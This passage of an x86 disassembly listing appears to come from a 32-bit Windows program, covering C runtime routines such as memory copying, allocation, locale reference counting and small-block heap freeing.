  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247a8:	lea    eax,[ecx*4+0x0]
  4247af:	add    esi,eax
  4247b1:	add    edi,eax
  4247b3:	jmp    DWORD PTR [edx*4+0x4247bc]
  4247ba:	mov    edi,edi
  4247bc:	int3   
  4247bd:	inc    edi
  4247be:	inc    edx
  4247bf:	add    ah,dl
  4247c1:	inc    edi
  4247c2:	inc    edx
  4247c3:	add    al,ah
  4247c5:	inc    edi
  4247c6:	inc    edx
  4247c7:	add    ah,dh
  4247c9:	inc    edi
  4247ca:	inc    edx
  4247cb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247d1:	leave  
  4247d2:	ret    
  4247d3:	nop
  4247d4:	mov    al,BYTE PTR [esi]
  4247d6:	mov    BYTE PTR [edi],al
  4247d8:	mov    eax,DWORD PTR [ebp+0x8]
  4247db:	pop    esi
  4247dc:	pop    edi
  4247dd:	leave  
  4247de:	ret    
  4247df:	nop
  4247e0:	mov    al,BYTE PTR [esi]
  4247e2:	mov    BYTE PTR [edi],al
  4247e4:	mov    al,BYTE PTR [esi+0x1]
  4247e7:	mov    BYTE PTR [edi+0x1],al
  4247ea:	mov    eax,DWORD PTR [ebp+0x8]
  4247ed:	pop    esi
  4247ee:	pop    edi
  4247ef:	leave  
  4247f0:	ret    
  4247f1:	lea    ecx,[ecx+0x0]
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    al,BYTE PTR [esi+0x1]
  4247fb:	mov    BYTE PTR [edi+0x1],al
  4247fe:	mov    al,BYTE PTR [esi+0x2]
  424801:	mov    BYTE PTR [edi+0x2],al
  424804:	mov    eax,DWORD PTR [ebp+0x8]
  424807:	pop    esi
  424808:	pop    edi
  424809:	leave  
  42480a:	ret    
  42480b:	nop
  42480c:	lea    esi,[ecx+esi*1-0x4]
  424810:	lea    edi,[ecx+edi*1-0x4]
  424814:	test   edi,0x3
  42481a:	jne    0x424840
  42481c:	shr    ecx,0x2
  42481f:	and    edx,0x3
  424822:	cmp    ecx,0x8
  424825:	jb     0x424834
  424827:	std    
  424828:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482a:	cld    
  42482b:	jmp    DWORD PTR [edx*4+0x424958]
  424832:	mov    edi,edi
  424834:	neg    ecx
  424836:	jmp    DWORD PTR [ecx*4+0x424908]
  42483d:	lea    ecx,[ecx+0x0]
  424840:	mov    eax,edi
  424842:	mov    edx,0x3
  424847:	cmp    ecx,0x4
  42484a:	jb     0x424858
  42484c:	and    eax,0x3
  42484f:	sub    ecx,eax
  424851:	jmp    DWORD PTR [eax*4+0x42485c]
  424858:	jmp    DWORD PTR [ecx*4+0x424958]
  42485f:	nop
  424860:	ins    BYTE PTR es:[edi],dx
  424861:	dec    eax
  424862:	inc    edx
  424863:	add    BYTE PTR [eax-0x47ffbdb8],dl
  424869:	dec    eax
  42486a:	inc    edx
  42486b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424871:	mov    BYTE PTR [edi+0x3],al
  424874:	sub    esi,0x1
  424877:	shr    ecx,0x2
  42487a:	sub    edi,0x1
  42487d:	cmp    ecx,0x8
  424880:	jb     0x424834
  424882:	std    
  424883:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424885:	cld    
  424886:	jmp    DWORD PTR [edx*4+0x424958]
  42488d:	lea    ecx,[ecx+0x0]
  424890:	mov    al,BYTE PTR [esi+0x3]
  424893:	and    edx,ecx
  424895:	mov    BYTE PTR [edi+0x3],al
  424898:	mov    al,BYTE PTR [esi+0x2]
  42489b:	shr    ecx,0x2
  42489e:	mov    BYTE PTR [edi+0x2],al
  4248a1:	sub    esi,0x2
  4248a4:	sub    edi,0x2
  4248a7:	cmp    ecx,0x8
  4248aa:	jb     0x424834
  4248ac:	std    
  4248ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248af:	cld    
  4248b0:	jmp    DWORD PTR [edx*4+0x424958]
  4248b7:	nop
  4248b8:	mov    al,BYTE PTR [esi+0x3]
  4248bb:	and    edx,ecx
  4248bd:	mov    BYTE PTR [edi+0x3],al
  4248c0:	mov    al,BYTE PTR [esi+0x2]
  4248c3:	mov    BYTE PTR [edi+0x2],al
  4248c6:	mov    al,BYTE PTR [esi+0x1]
  4248c9:	shr    ecx,0x2
  4248cc:	mov    BYTE PTR [edi+0x1],al
  4248cf:	sub    esi,0x3
  4248d2:	sub    edi,0x3
  4248d5:	cmp    ecx,0x8
  4248d8:	jb     0x424834
  4248de:	std    
  4248df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248e1:	cld    
  4248e2:	jmp    DWORD PTR [edx*4+0x424958]
  4248e9:	lea    ecx,[ecx+0x0]
  4248ec:	or     al,0x49
  4248ee:	inc    edx
  4248ef:	add    BYTE PTR [ecx+ecx*2],dl
  4248f2:	inc    edx
  4248f3:	add    BYTE PTR [ecx+ecx*2],bl
  4248f6:	inc    edx
  4248f7:	add    BYTE PTR [ecx+ecx*2],ah
  4248fa:	inc    edx
  4248fb:	add    BYTE PTR [ecx+ecx*2],ch
  4248fe:	inc    edx
  4248ff:	add    BYTE PTR [ecx+ecx*2],dh
  424902:	inc    edx
  424903:	add    BYTE PTR [ecx+ecx*2],bh
  424906:	inc    edx
  424907:	add    BYTE PTR [edi+0x49],cl
  42490a:	inc    edx
  42490b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424911:	inc    esp
  424912:	(bad)  
  424913:	sbb    al,0x8b
  424915:	inc    esp
  424916:	mov    ds,WORD PTR [eax]
  424918:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42491c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424920:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424924:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424928:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42492c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424930:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424934:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424938:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424940:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424944:	lea    eax,[ecx*4+0x0]
  42494b:	add    esi,eax
  42494d:	add    edi,eax
  42494f:	jmp    DWORD PTR [edx*4+0x424958]
  424956:	mov    edi,edi
  424958:	push   0x70004249
  42495d:	dec    ecx
  42495e:	inc    edx
  42495f:	add    BYTE PTR [eax-0x6bffbdb7],al
  424965:	dec    ecx
  424966:	inc    edx
  424967:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42496d:	leave  
  42496e:	ret    
  42496f:	nop
  424970:	mov    al,BYTE PTR [esi+0x3]
  424973:	mov    BYTE PTR [edi+0x3],al
  424976:	mov    eax,DWORD PTR [ebp+0x8]
  424979:	pop    esi
  42497a:	pop    edi
  42497b:	leave  
  42497c:	ret    
  42497d:	lea    ecx,[ecx+0x0]
  424980:	mov    al,BYTE PTR [esi+0x3]
  424983:	mov    BYTE PTR [edi+0x3],al
  424986:	mov    al,BYTE PTR [esi+0x2]
  424989:	mov    BYTE PTR [edi+0x2],al
  42498c:	mov    eax,DWORD PTR [ebp+0x8]
  42498f:	pop    esi
  424990:	pop    edi
  424991:	leave  
  424992:	ret    
  424993:	nop
  424994:	mov    al,BYTE PTR [esi+0x3]
  424997:	mov    BYTE PTR [edi+0x3],al
  42499a:	mov    al,BYTE PTR [esi+0x2]
  42499d:	mov    BYTE PTR [edi+0x2],al
  4249a0:	mov    al,BYTE PTR [esi+0x1]
  4249a3:	mov    BYTE PTR [edi+0x1],al
  4249a6:	mov    eax,DWORD PTR [ebp+0x8]
  4249a9:	pop    esi
  4249aa:	pop    edi
  4249ab:	leave  
  4249ac:	ret    
  4249ad:	push   DWORD PTR [esp+0x4]
  4249b1:	call   DWORD PTR ds:0x4280e4
  4249b7:	xor    eax,eax
  4249b9:	inc    eax
  4249ba:	ret    0x8
  4249bd:	push   0x10
  4249bf:	push   0x428608
  4249c4:	call   0x423934
  4249c9:	mov    eax,ds:0x462f68
  4249ce:	test   eax,eax
  4249d0:	jne    0x424a09
  4249d2:	cmp    DWORD PTR ds:0x462ca4,0x1
  4249d9:	je     0x4249ff
  4249db:	push   0x4285f4
  4249e0:	call   DWORD PTR ds:0x428018
  4249e6:	test   eax,eax
  4249e8:	je     0x4249ff
  4249ea:	push   0x4285cc
  4249ef:	push   eax
  4249f0:	call   DWORD PTR ds:0x428014
  4249f6:	mov    ds:0x462f68,eax
  4249fb:	test   eax,eax
  4249fd:	jne    0x424a09
  4249ff:	mov    eax,0x4249ad
  424a04:	mov    ds:0x462f68,eax
  424a09:	and    DWORD PTR [ebp-0x4],0x0
  424a0d:	push   DWORD PTR [ebp+0xc]
  424a10:	push   DWORD PTR [ebp+0x8]
  424a13:	call   eax
  424a15:	mov    DWORD PTR [ebp-0x1c],eax
  424a18:	jmp    0x424a3e
  424a1a:	mov    eax,DWORD PTR [ebp-0x14]
  424a1d:	mov    eax,DWORD PTR [eax]
  424a1f:	mov    eax,DWORD PTR [eax]
  424a21:	mov    DWORD PTR [ebp-0x20],eax
  424a24:	xor    eax,eax
  424a26:	inc    eax
  424a27:	ret    
  424a28:	mov    esp,DWORD PTR [ebp-0x18]
  424a2b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a32:	jne    0x424a3c
  424a34:	push   0x8
  424a36:	call   DWORD PTR ds:0x4280a8
  424a3c:	xor    eax,eax
  424a3e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a42:	call   0x42396f
  424a47:	ret    
  424a48:	push   0x10
  424a4a:	push   0x428618
  424a4f:	call   0x423934
  424a54:	mov    esi,DWORD PTR [ebp+0x8]
  424a57:	imul   esi,DWORD PTR [ebp+0xc]
  424a5b:	mov    DWORD PTR [ebp-0x1c],esi
  424a5e:	test   esi,esi
  424a60:	jne    0x424a63
  424a62:	inc    esi
  424a63:	xor    edi,edi
  424a65:	mov    DWORD PTR [ebp-0x20],edi
  424a68:	cmp    esi,0xffffffe0
  424a6b:	ja     0x424ad2
  424a6d:	cmp    DWORD PTR ds:0x463324,0x3
  424a74:	jne    0x424abd
  424a76:	add    esi,0xf
  424a79:	and    esi,0xfffffff0
  424a7c:	mov    DWORD PTR [ebp+0xc],esi
  424a7f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a82:	cmp    ebx,DWORD PTR ds:0x4630e4
  424a88:	ja     0x424abd
  424a8a:	push   0x4
  424a8c:	call   0x423aef
  424a91:	pop    ecx
  424a92:	and    DWORD PTR [ebp-0x4],edi
  424a95:	push   ebx
  424a96:	call   0x4254f1
  424a9b:	pop    ecx
  424a9c:	mov    DWORD PTR [ebp-0x20],eax
  424a9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424aa3:	call   0x424af2
  424aa8:	mov    edi,DWORD PTR [ebp-0x20]
  424aab:	test   edi,edi
  424aad:	je     0x424ac1
  424aaf:	push   DWORD PTR [ebp-0x1c]
  424ab2:	push   0x0
  424ab4:	push   edi
  424ab5:	call   0x426230
  424aba:	add    esp,0xc
  424abd:	test   edi,edi
  424abf:	jne    0x424afb
  424ac1:	push   esi
  424ac2:	push   0x8
  424ac4:	push   DWORD PTR ds:0x463320
  424aca:	call   DWORD PTR ds:0x4280e0
  424ad0:	mov    edi,eax
  424ad2:	test   edi,edi
  424ad4:	jne    0x424afb
  424ad6:	cmp    DWORD PTR ds:0x462fa8,edi
  424adc:	je     0x424afb
  424ade:	push   esi
  424adf:	call   0x426212
  424ae4:	pop    ecx
  424ae5:	test   eax,eax
  424ae7:	jne    0x424a63
  424aed:	jmp    0x424afd
  424aef:	mov    esi,DWORD PTR [ebp+0xc]
  424af2:	push   0x4
  424af4:	call   0x423a5b
  424af9:	pop    ecx
  424afa:	ret    
  424afb:	mov    eax,edi
  424afd:	call   0x42396f
  424b02:	ret    
  424b03:	push   esi
  424b04:	mov    esi,DWORD PTR [esp+0x8]
  424b08:	mov    eax,DWORD PTR [esi+0x3c]
  424b0b:	push   edi
  424b0c:	xor    edi,edi
  424b0e:	cmp    eax,DWORD PTR ds:0x462fb4
  424b14:	je     0x424b79
  424b16:	cmp    eax,edi
  424b18:	je     0x424b79
  424b1a:	mov    eax,DWORD PTR [esi+0x2c]
  424b1d:	cmp    DWORD PTR [eax],edi
  424b1f:	jne    0x424b79
  424b21:	mov    eax,DWORD PTR [esi+0x34]
  424b24:	cmp    eax,edi
  424b26:	je     0x424b44
  424b28:	cmp    DWORD PTR [eax],edi
  424b2a:	jne    0x424b44
  424b2c:	cmp    eax,DWORD PTR ds:0x4630d0
  424b32:	je     0x424b44
  424b34:	push   eax
  424b35:	call   0x42453a
  424b3a:	push   DWORD PTR [esi+0x3c]
  424b3d:	call   0x42647f
  424b42:	pop    ecx
  424b43:	pop    ecx
  424b44:	mov    eax,DWORD PTR [esi+0x30]
  424b47:	cmp    eax,edi
  424b49:	je     0x424b67
  424b4b:	cmp    DWORD PTR [eax],edi
  424b4d:	jne    0x424b67
  424b4f:	cmp    eax,DWORD PTR ds:0x4630d4
  424b55:	je     0x424b67
  424b57:	push   eax
  424b58:	call   0x42453a
  424b5d:	push   DWORD PTR [esi+0x3c]
  424b60:	call   0x426420
  424b65:	pop    ecx
  424b66:	pop    ecx
  424b67:	push   DWORD PTR [esi+0x2c]
  424b6a:	call   0x42453a
  424b6f:	push   DWORD PTR [esi+0x3c]
  424b72:	call   0x42453a
  424b77:	pop    ecx
  424b78:	pop    ecx
  424b79:	mov    eax,DWORD PTR [esi+0x40]
  424b7c:	cmp    eax,DWORD PTR ds:0x4630cc
  424b82:	je     0x424b9c
  424b84:	cmp    eax,edi
  424b86:	je     0x424b9c
  424b88:	cmp    DWORD PTR [eax],edi
  424b8a:	jne    0x424b9c
  424b8c:	push   eax
  424b8d:	call   0x42453a
  424b92:	push   DWORD PTR [esi+0x44]
  424b95:	call   0x42453a
  424b9a:	pop    ecx
  424b9b:	pop    ecx
  424b9c:	mov    eax,DWORD PTR [esi+0x50]
  424b9f:	cmp    eax,DWORD PTR ds:0x462fb0
  424ba5:	je     0x424bc3
  424ba7:	cmp    eax,edi
  424ba9:	je     0x424bc3
  424bab:	cmp    DWORD PTR [eax+0xb4],edi
  424bb1:	jne    0x424bc3
  424bb3:	push   eax
  424bb4:	call   0x426290
  424bb9:	push   DWORD PTR [esi+0x50]
  424bbc:	call   0x42453a
  424bc1:	pop    ecx
  424bc2:	pop    ecx
  424bc3:	push   esi
  424bc4:	call   0x42453a
  424bc9:	pop    ecx
  424bca:	pop    edi
  424bcb:	pop    esi
  424bcc:	ret    
  424bcd:	push   esi
  424bce:	call   0x4237e9
  424bd3:	mov    esi,eax
  424bd5:	mov    eax,DWORD PTR [esi+0x64]
  424bd8:	cmp    eax,DWORD PTR ds:0x46275c
  424bde:	je     0x424c8a
  424be4:	test   eax,eax
  424be6:	je     0x424c17
  424be8:	mov    ecx,DWORD PTR [eax+0x2c]
  424beb:	dec    DWORD PTR [eax]
  424bed:	test   ecx,ecx
  424bef:	je     0x424bf3
  424bf1:	dec    DWORD PTR [ecx]
  424bf3:	mov    ecx,DWORD PTR [eax+0x34]
  424bf6:	test   ecx,ecx
  424bf8:	je     0x424bfc
  424bfa:	dec    DWORD PTR [ecx]
  424bfc:	mov    ecx,DWORD PTR [eax+0x30]
  424bff:	test   ecx,ecx
  424c01:	je     0x424c05
  424c03:	dec    DWORD PTR [ecx]
  424c05:	mov    ecx,DWORD PTR [eax+0x40]
  424c08:	test   ecx,ecx
  424c0a:	je     0x424c0e
  424c0c:	dec    DWORD PTR [ecx]
  424c0e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c11:	dec    DWORD PTR [ecx+0xb4]
  424c17:	mov    ecx,DWORD PTR ds:0x46275c
  424c1d:	mov    DWORD PTR [esi+0x64],ecx
  424c20:	mov    ecx,DWORD PTR ds:0x46275c
  424c26:	inc    DWORD PTR [ecx]
  424c28:	mov    ecx,DWORD PTR ds:0x46275c
  424c2e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c31:	test   ecx,ecx
  424c33:	je     0x424c37
  424c35:	inc    DWORD PTR [ecx]
  424c37:	mov    ecx,DWORD PTR ds:0x46275c
  424c3d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c40:	test   ecx,ecx
  424c42:	je     0x424c46
  424c44:	inc    DWORD PTR [ecx]
  424c46:	mov    ecx,DWORD PTR ds:0x46275c
  424c4c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c4f:	test   ecx,ecx
  424c51:	je     0x424c55
  424c53:	inc    DWORD PTR [ecx]
  424c55:	mov    ecx,DWORD PTR ds:0x46275c
  424c5b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c5e:	test   ecx,ecx
  424c60:	je     0x424c64
  424c62:	inc    DWORD PTR [ecx]
  424c64:	mov    ecx,DWORD PTR ds:0x46275c
  424c6a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c6d:	inc    DWORD PTR [ecx+0xb4]
  424c73:	test   eax,eax
  424c75:	je     0x424c8a
  424c77:	cmp    DWORD PTR [eax],0x0
  424c7a:	jne    0x424c8a
  424c7c:	cmp    eax,0x462708
  424c81:	je     0x424c8a
  424c83:	push   eax
  424c84:	call   0x424b03
  424c89:	pop    ecx
  424c8a:	mov    eax,DWORD PTR [esi+0x64]
  424c8d:	pop    esi
  424c8e:	ret    
  424c8f:	push   0xc
  424c91:	push   0x4287a8
  424c96:	call   0x423934
  424c9b:	push   0xc
  424c9d:	call   0x423aef
  424ca2:	pop    ecx
  424ca3:	and    DWORD PTR [ebp-0x4],0x0
  424ca7:	call   0x424bcd
  424cac:	mov    DWORD PTR [ebp-0x1c],eax
  424caf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cb3:	call   0x424cc1
  424cb8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cbb:	call   0x42396f
  424cc0:	ret    
  424cc1:	push   0xc
  424cc3:	call   0x423a5b
  424cc8:	pop    ecx
  424cc9:	ret    
  424cca:	push   0x140
  424ccf:	push   0x0
  424cd1:	push   DWORD PTR ds:0x463320
  424cd7:	call   DWORD PTR ds:0x4280e0
  424cdd:	test   eax,eax
  424cdf:	mov    ds:0x4630e0,eax
  424ce4:	jne    0x424ce7
  424ce6:	ret    
  424ce7:	mov    ecx,DWORD PTR [esp+0x4]
  424ceb:	and    DWORD PTR ds:0x4630d8,0x0
  424cf2:	and    DWORD PTR ds:0x4630dc,0x0
  424cf9:	mov    ds:0x4630e8,eax
  424cfe:	xor    eax,eax
  424d00:	mov    DWORD PTR ds:0x4630e4,ecx
  424d06:	mov    DWORD PTR ds:0x4630ec,0x10
  424d10:	inc    eax
  424d11:	ret    
  424d12:	mov    eax,ds:0x4630dc
  424d17:	lea    ecx,[eax+eax*4]
  424d1a:	mov    eax,ds:0x4630e0
  424d1f:	lea    ecx,[eax+ecx*4]
  424d22:	jmp    0x424d36
  424d24:	mov    edx,DWORD PTR [esp+0x4]
  424d28:	sub    edx,DWORD PTR [eax+0xc]
  424d2b:	cmp    edx,0x100000
  424d31:	jb     0x424d3c
  424d33:	add    eax,0x14
  424d36:	cmp    eax,ecx
  424d38:	jb     0x424d24
  424d3a:	xor    eax,eax
  424d3c:	ret    
  424d3d:	push   ebp
  424d3e:	mov    ebp,esp
  424d40:	sub    esp,0x10
  424d43:	mov    ecx,DWORD PTR [ebp+0x8]
  424d46:	mov    eax,DWORD PTR [ecx+0x10]
  424d49:	push   esi
  424d4a:	mov    esi,DWORD PTR [ebp+0xc]
  424d4d:	push   edi
  424d4e:	mov    edi,esi
  424d50:	sub    edi,DWORD PTR [ecx+0xc]
  424d53:	add    esi,0xfffffffc
  424d56:	shr    edi,0xf
  424d59:	mov    ecx,edi
  424d5b:	imul   ecx,ecx,0x204
  424d61:	lea    ecx,[ecx+eax*1+0x144]
  424d68:	mov    DWORD PTR [ebp-0x10],ecx
  424d6b:	mov    ecx,DWORD PTR [esi]
  424d6d:	dec    ecx
  424d6e:	test   cl,0x1
  424d71:	mov    DWORD PTR [ebp-0x4],ecx
  424d74:	jne    0x425051
  424d7a:	push   ebx
  424d7b:	lea    ebx,[ecx+esi*1]
  424d7e:	mov    edx,DWORD PTR [ebx]
  424d80:	mov    DWORD PTR [ebp-0xc],edx
  424d83:	mov    edx,DWORD PTR [esi-0x4]
  424d86:	mov    DWORD PTR [ebp-0x8],edx
  424d89:	mov    edx,DWORD PTR [ebp-0xc]
  424d8c:	test   dl,0x1
  424d8f:	mov    DWORD PTR [ebp+0xc],ebx
  424d92:	jne    0x424e08
  424d94:	sar    edx,0x4
  424d97:	dec    edx
  424d98:	cmp    edx,0x3f
  424d9b:	jbe    0x424da0
  424d9d:	push   0x3f
  424d9f:	pop    edx
  424da0:	mov    ecx,DWORD PTR [ebx+0x4]
  424da3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424da6:	jne    0x424dea
  424da8:	cmp    edx,0x20
  424dab:	mov    ebx,0x80000000
  424db0:	jae    0x424dcb
  424db2:	mov    ecx,edx
  424db4:	shr    ebx,cl
  424db6:	lea    ecx,[edx+eax*1+0x4]
  424dba:	not    ebx
  424dbc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424dc0:	dec    BYTE PTR [ecx]
  424dc2:	jne    0x424de7
  424dc4:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc7:	and    DWORD PTR [ecx],ebx
  424dc9:	jmp    0x424de7
  424dcb:	lea    ecx,[edx-0x20]
  424dce:	shr    ebx,cl
  424dd0:	lea    ecx,[edx+eax*1+0x4]
  424dd4:	not    ebx
  424dd6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424ddd:	dec    BYTE PTR [ecx]
  424ddf:	jne    0x424de7
  424de1:	mov    ecx,DWORD PTR [ebp+0x8]
  424de4:	and    DWORD PTR [ecx+0x4],ebx
  424de7:	mov    ebx,DWORD PTR [ebp+0xc]
  424dea:	mov    edx,DWORD PTR [ebx+0x8]
  424ded:	mov    ebx,DWORD PTR [ebx+0x4]
  424df0:	mov    ecx,DWORD PTR [ebp-0x4]
  424df3:	add    ecx,DWORD PTR [ebp-0xc]
  424df6:	mov    DWORD PTR [edx+0x4],ebx
  424df9:	mov    edx,DWORD PTR [ebp+0xc]
  424dfc:	mov    ebx,DWORD PTR [edx+0x4]
  424dff:	mov    edx,DWORD PTR [edx+0x8]
  424e02:	mov    DWORD PTR [ebx+0x8],edx
  424e05:	mov    DWORD PTR [ebp-0x4],ecx
  424e08:	mov    edx,ecx
  424e0a:	sar    edx,0x4
  424e0d:	dec    edx
  424e0e:	cmp    edx,0x3f
  424e11:	jbe    0x424e16
  424e13:	push   0x3f
  424e15:	pop    edx
  424e16:	mov    ebx,DWORD PTR [ebp-0x8]
  424e19:	and    ebx,0x1
  424e1c:	mov    DWORD PTR [ebp-0xc],ebx
  424e1f:	jne    0x424eb4
  424e25:	sub    esi,DWORD PTR [ebp-0x8]
  424e28:	mov    ebx,DWORD PTR [ebp-0x8]
  424e2b:	sar    ebx,0x4
  424e2e:	push   0x3f
  424e30:	mov    DWORD PTR [ebp+0xc],esi
  424e33:	dec    ebx
  424e34:	pop    esi
  424e35:	cmp    ebx,esi
  424e37:	jbe    0x424e3b
  424e39:	mov    ebx,esi
  424e3b:	add    ecx,DWORD PTR [ebp-0x8]
  424e3e:	mov    edx,ecx
  424e40:	sar    edx,0x4
  424e43:	dec    edx
  424e44:	cmp    edx,esi
  424e46:	mov    DWORD PTR [ebp-0x4],ecx
  424e49:	jbe    0x424e4d
  424e4b:	mov    edx,esi
  424e4d:	cmp    ebx,edx
  424e4f:	je     0x424eaf
  424e51:	mov    ecx,DWORD PTR [ebp+0xc]
  424e54:	mov    esi,DWORD PTR [ecx+0x4]
  424e57:	cmp    esi,DWORD PTR [ecx+0x8]
  424e5a:	jne    0x424e97
  424e5c:	cmp    ebx,0x20
  424e5f:	mov    esi,0x80000000
  424e64:	jae    0x424e7d
  424e66:	mov    ecx,ebx
  424e68:	shr    esi,cl
  424e6a:	not    esi
  424e6c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e70:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e74:	jne    0x424e97
  424e76:	mov    ecx,DWORD PTR [ebp+0x8]
  424e79:	and    DWORD PTR [ecx],esi
  424e7b:	jmp    0x424e97
  424e7d:	lea    ecx,[ebx-0x20]
  424e80:	shr    esi,cl
  424e82:	not    esi
  424e84:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e8b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e8f:	jne    0x424e97
  424e91:	mov    ecx,DWORD PTR [ebp+0x8]
  424e94:	and    DWORD PTR [ecx+0x4],esi
  424e97:	mov    ecx,DWORD PTR [ebp+0xc]
  424e9a:	mov    esi,DWORD PTR [ecx+0x8]
  424e9d:	mov    ecx,DWORD PTR [ecx+0x4]
  424ea0:	mov    DWORD PTR [esi+0x4],ecx
  424ea3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ea6:	mov    esi,DWORD PTR [ecx+0x4]
  424ea9:	mov    ecx,DWORD PTR [ecx+0x8]
  424eac:	mov    DWORD PTR [esi+0x8],ecx
  424eaf:	mov    esi,DWORD PTR [ebp+0xc]
  424eb2:	jmp    0x424eb7
  424eb4:	mov    ebx,DWORD PTR [ebp+0x8]
  424eb7:	cmp    DWORD PTR [ebp-0xc],0x0
  424ebb:	jne    0x424ec5
  424ebd:	cmp    ebx,edx
  424ebf:	je     0x424f45
  424ec5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ec8:	lea    ecx,[ecx+edx*8]
  424ecb:	mov    ebx,DWORD PTR [ecx+0x4]
  424ece:	mov    DWORD PTR [esi+0x8],ecx
  424ed1:	mov    DWORD PTR [esi+0x4],ebx
  424ed4:	mov    DWORD PTR [ecx+0x4],esi
  424ed7:	mov    ecx,DWORD PTR [esi+0x4]
  424eda:	mov    DWORD PTR [ecx+0x8],esi
  424edd:	mov    ecx,DWORD PTR [esi+0x4]
  424ee0:	cmp    ecx,DWORD PTR [esi+0x8]
  424ee3:	jne    0x424f45
  424ee5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424ee9:	mov    BYTE PTR [ebp+0xf],cl
  424eec:	inc    cl
  424eee:	cmp    edx,0x20
  424ef1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424ef5:	jae    0x424f1c
  424ef7:	cmp    BYTE PTR [ebp+0xf],0x0
  424efb:	jne    0x424f0b
  424efd:	mov    ecx,edx
  424eff:	mov    ebx,0x80000000
  424f04:	shr    ebx,cl
  424f06:	mov    ecx,DWORD PTR [ebp+0x8]
  424f09:	or     DWORD PTR [ecx],ebx
  424f0b:	mov    ebx,0x80000000
  424f10:	mov    ecx,edx
  424f12:	shr    ebx,cl
  424f14:	lea    eax,[eax+edi*4+0x44]
  424f18:	or     DWORD PTR [eax],ebx
  424f1a:	jmp    0x424f45
  424f1c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f20:	jne    0x424f32
  424f22:	lea    ecx,[edx-0x20]
  424f25:	mov    ebx,0x80000000
  424f2a:	shr    ebx,cl
  424f2c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f2f:	or     DWORD PTR [ecx+0x4],ebx
  424f32:	lea    ecx,[edx-0x20]
  424f35:	mov    edx,0x80000000
  424f3a:	shr    edx,cl
  424f3c:	lea    eax,[eax+edi*4+0xc4]
  424f43:	or     DWORD PTR [eax],edx
  424f45:	mov    eax,DWORD PTR [ebp-0x4]
  424f48:	mov    DWORD PTR [esi],eax
  424f4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f4e:	mov    eax,DWORD PTR [ebp-0x10]
  424f51:	dec    DWORD PTR [eax]
  424f53:	jne    0x425050
  424f59:	mov    eax,ds:0x4630d8
  424f5e:	test   eax,eax
  424f60:	je     0x425042
  424f66:	mov    ecx,DWORD PTR ds:0x4630f0
  424f6c:	mov    esi,DWORD PTR ds:0x4280c0
  424f72:	push   0x4000
  424f77:	shl    ecx,0xf
  424f7a:	add    ecx,DWORD PTR [eax+0xc]
  424f7d:	mov    ebx,0x8000
  424f82:	push   ebx
  424f83:	push   ecx
  424f84:	call   esi
  424f86:	mov    ecx,DWORD PTR ds:0x4630f0
  424f8c:	mov    eax,ds:0x4630d8
  424f91:	mov    edx,0x80000000
  424f96:	shr    edx,cl
  424f98:	or     DWORD PTR [eax+0x8],edx
  424f9b:	mov    eax,ds:0x4630d8
  424fa0:	mov    eax,DWORD PTR [eax+0x10]
  424fa3:	mov    ecx,DWORD PTR ds:0x4630f0
  424fa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fb1:	mov    eax,ds:0x4630d8
  424fb6:	mov    eax,DWORD PTR [eax+0x10]
  424fb9:	dec    BYTE PTR [eax+0x43]
  424fbc:	mov    eax,ds:0x4630d8
  424fc1:	mov    ecx,DWORD PTR [eax+0x10]
  424fc4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fc8:	jne    0x424fd3
  424fca:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fce:	mov    eax,ds:0x4630d8
  424fd3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424fd7:	jne    0x425042
  424fd9:	push   ebx
  424fda:	push   0x0
  424fdc:	push   DWORD PTR [eax+0xc]
  424fdf:	call   esi
  424fe1:	mov    eax,ds:0x4630d8
  424fe6:	push   DWORD PTR [eax+0x10]
  424fe9:	push   0x0
